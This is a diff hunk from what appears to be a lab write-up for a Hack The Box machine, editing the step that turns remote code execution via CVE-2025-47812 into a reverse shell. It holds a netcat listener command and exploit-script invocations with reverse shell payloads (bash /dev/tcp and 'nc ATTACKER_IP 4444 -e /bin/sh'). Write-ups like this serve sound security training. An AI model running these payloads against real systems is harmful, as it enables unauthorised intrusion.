@@ -575,8 +575,7 @@ Once RCE is confirmed, the logical next step is to move from single command exec
 - **Listener:** On your Kali machine, start a listener: `nc -lvnp 4444`.
 - **Exploit:** Run the script with a bash reverse shell payload:
 
-Command: `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1"`
-`python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc [ATTACKER_IP] 4444 -e /bin/sh" -v`
+Command: `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc ATTACKER_IP 4444 -e /bin/sh" -v`
 
 Output:
 
